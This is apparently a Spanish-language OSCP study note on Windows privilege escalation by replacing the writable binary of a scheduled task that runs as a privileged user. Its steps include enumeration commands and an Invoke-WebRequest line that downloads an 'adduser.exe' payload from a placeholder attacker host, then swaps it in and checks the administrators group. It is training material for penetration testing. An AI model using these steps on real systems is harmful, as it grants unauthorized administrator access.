---
tipo: tecnica
fase: privesc
so: windows
tags: [oscp, tecnica, privesc, windows]
fecha: 2026-10-08
---

# Scheduled Tasks Privesc

> [!abstract] Qué es y cuándo usarla
> Las tareas programadas de Windows ejecutan un binario bajo un **principal** (usuario) concreto cuando se cumple un **trigger**. Si una tarea corre como un user privilegiado (o SYSTEM) y su binario es escribible por el user actual, sustituirlo da ejecución de código en el contexto de ese principal cuando la tarea se dispare de nuevo.

## Requisitos previos
- Listar tareas con detalle: `schtasks /query /fo LIST /v` (buscar `Author`, `TaskName`, `Task To Run`, `Run As User`, `Next Run Time`).
- Comprobar permisos de escritura sobre el binario que ejecuta la tarea: `icacls <ruta_binario>`.
- Idealmente, que el `Next Run Time` sea cercano (si no, puede tardar en dispararse).

## Pasos
```powershell
schtasks /query /fo LIST /v | findstr /i "TaskName Run"    # vista rápida
icacls C:\ruta\al\binario_de_la_tarea.exe                   # confirmar permisos de escritura
```
```powershell
iwr -Uri http://<IP_kali>/adduser.exe -Outfile binario_de_la_tarea.exe
move .\ruta\binario_de_la_tarea.exe binario_de_la_tarea.exe.bak
move .\binario_de_la_tarea.exe .\ruta\
# esperar al Next Run Time y comprobar:
net localgroup administrators
```

> [!warning] Detección / problemas
> - El binario puede estar en una carpeta del propio user (ej. su Pictures/Documents) aunque la tarea la haya creado un admin — ahí es donde suele fallar el diseño.
> - Hay que esperar al disparo del trigger; si es poco frecuente, considerar provocar el evento que lo dispara en vez de esperar.
> - Restaurar el binario original tras confirmar el acceso.

## Visto en
- Módulo: [[17 - Windows Privilege Escalation]]
- Relacionado: [[Service Binary Hijacking]]
- Máquinas: [[]]
